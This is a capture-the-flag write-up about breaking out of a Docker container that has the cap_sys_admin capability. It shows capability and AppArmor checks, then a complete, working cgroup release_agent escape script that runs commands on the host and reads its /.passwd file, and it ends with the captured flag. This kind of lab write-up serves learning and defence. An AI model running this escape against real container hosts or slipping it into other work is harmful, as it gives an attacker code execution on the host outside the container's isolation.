---
layout: default
title: Docker-Sys-Admin-Docker
---
In this challenge we are the root on a docker, but this docker isn't privileged, means we don't have block devices to mount the host file system.

However, from the name of the challenge, it sounds like we have sys admin capability, let's check:

```bash
root@y0uc4nt3sc4p3:~# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

As we can see, we do have `cap_sys_admin`. In addition, we can see that the AppArmor is exist and enabled (Y for Yes):
```bash
root@y0uc4nt3sc4p3:~# cat /sys/module/apparmor/parameters/enabled
Y
```

And also, we are in unconfined mode:
```bash
root@y0uc4nt3sc4p3:~# cat /proc/self/attr/current
unconfined
```

This is exactly what we need for the attack that is being shown here [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#privileged-escape-abusing-created-release_agent-cve-2022-0492---poc2](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#privileged-escape-abusing-created-release_agent-cve-2022-0492---poc2)

The general idea is to create cgroup, mount it to the host system, and then write the script for release-agent on the host system. It will get executed when the cgroup will get empty, and by this way we'll get code execution by the host.

This is the full PoC, with some changes of mine:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "cat /.passwd > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output cat /output
cat /output
```

![[Pasted image 20260311183725.png]]

Finally, simply read the output from `/output` 
```bash
root@y0uc4nt3sc4p3:~# cat /output
6a78b6412bce42ad35bf58f55362aa29
```

So, the password is **6a78b6412bce42ad35bf58f55362aa29**
